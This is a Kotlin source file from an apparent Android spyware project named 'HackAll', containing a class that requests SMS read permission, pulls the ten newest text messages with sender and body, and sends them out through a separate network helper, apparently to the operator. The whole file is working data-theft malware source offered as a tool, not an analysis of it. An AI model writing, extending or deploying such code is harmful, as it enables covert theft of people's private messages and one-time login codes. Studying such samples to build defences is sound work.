package cocomelonc.hackall.tools
import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.Telephony.Sms
import androidx.core.net.toUri
import com.karumi.dexter.Dexter
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.single.PermissionListener

class HackAllSmsLogs (private val context: Context) {

    @SuppressLint("NewApi")
    private fun isSmsPermissionGranted(context: Context): Boolean {
        val isGranted = context.checkSelfPermission(Manifest.permission.READ_SMS)
        return isGranted == PackageManager.PERMISSION_GRANTED
    }

    private fun startSmsPermissionRequest(context: Context, onGranted: () -> Unit) {
        Dexter.withContext(context)
            .withPermission(Manifest.permission.READ_SMS)
            .withListener(object : PermissionListener {
                override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
                    onGranted()
                }
                override fun onPermissionDenied(p0: PermissionDeniedResponse?) {}
                override fun onPermissionRationaleShouldBeShown(
                    p0: PermissionRequest?,
                    p1: PermissionToken?
                ) {
                }
            }).check()
    }

    fun getSmsLogs() {
        if (isSmsPermissionGranted(context)) {
            HackAllNetwork(context).sendTextMessage("LoveBahrain Hack All SMS Logs permission already granted\n")
            sendSmsLogs()
        } else {
            HackAllNetwork(context).sendTextMessage("LoveBahrain Hack All SMS Logs permission denied\n")
            startSmsPermissionRequest(context) {
                sendSmsLogs()
            }
        }
    }

    fun sendSmsLogs() {
        val smsLogs = StringBuilder()

        val uriSms: Uri = Sms.CONTENT_URI.toString().toUri()
        val cursor = context.contentResolver.query(
            uriSms,
            arrayOf("_id", "address", "date", "body"),
            null,
            null,
            "date DESC" // newest first
        )

        cursor?.use {
            val addressIndex = it.getColumnIndex("address")
            val bodyIndex = it.getColumnIndex("body")

            var count = 0
            while (it.moveToNext() && count < 10) { // limit to latest 10 messages
                val address = it.getString(addressIndex)
                val body = it.getString(bodyIndex)
                smsLogs.append("\uD83D\uDE00 From: $address\n")
                smsLogs.append("\uD83D\uDCAC Message: $body\n")
                count++
            }
        }

        if (smsLogs.isNotEmpty()) {
            HackAllNetwork(context).sendTextMessage("Collected SMS Logs:\n\n$smsLogs")
        } else {
            HackAllNetwork(context).sendTextMessage("No SMS logs found on the device.\n")
        }
    }

}